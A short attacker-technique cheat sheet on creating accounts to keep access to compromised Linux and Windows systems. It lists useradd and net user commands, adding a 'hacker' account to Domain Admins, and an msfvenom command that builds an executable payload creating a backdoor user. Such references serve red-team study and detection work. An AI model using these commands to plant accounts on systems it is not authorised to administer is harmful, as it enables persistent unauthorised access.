Adversaries may create an account to maintain access to victim systems. With a sufficient level of access, creating such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.

**Linux**
- Create a user `sudo useradd <username>`
- Create a system user `sudo useradd -r username`
- Create a user with specific User ID `sudo useradd -u 1500 <username>`
- Create a user with a specific group ID `sudo useradd -g <users> <username>`
- Remove an account `sudo userdel <username>`
- Change password of an account `sudo passwd <username>`

- List users `cat /etc/passwd`  `cut -d: -f1 /etc/passwd`

**Windows**
- Create an account `net user /add <username> <password>`
- Add account to local admin group `net localgroup administrators <username> /add`
- Add user to domain group
	- `net group groupName userName /ADD /DOMAIN`
	- `net group "Domain Admins" hacker /ADD /DOMAIN`
- Remove an account `net user <username> /delete`
- Change password of an account `net user <username> <newpassword>`
- Create User

		 msfvenom -p windows/adduser USER=hacker PASS=Hacker123$ -f exe > adduser.exe
